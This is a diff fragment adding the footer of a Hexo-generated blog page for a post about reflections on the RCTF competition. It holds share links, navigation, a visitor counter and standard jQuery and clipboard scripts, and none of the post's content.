+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/rctf%E5%90%8E%E6%84%9F/&name=rctf后感&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/rctf%E5%90%8E%E6%84%9F/&t=rctf后感"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Sh_eePppp
+  </div>
+
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">h0me</a></li><!--
+    --><!--
+      --><li><a href="/categories">Categ0r1es</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Artic1es</a></li><!--
+    --><!--
+      --><li><a href="/links/">L1nks</a></li><!--
+    --><!--
+      --><li><a href="/search/">Searh</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+
+  <!-- 邮箱信息独立出来，靠右下角 -->
+  <div class="footer-contact">
+    如果文章出现错误，可以联系我进行更改，感谢 
+    <a href="mailto:sh_eepppp@qq.com  ：）">sh_eepppp@qq.com</a>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
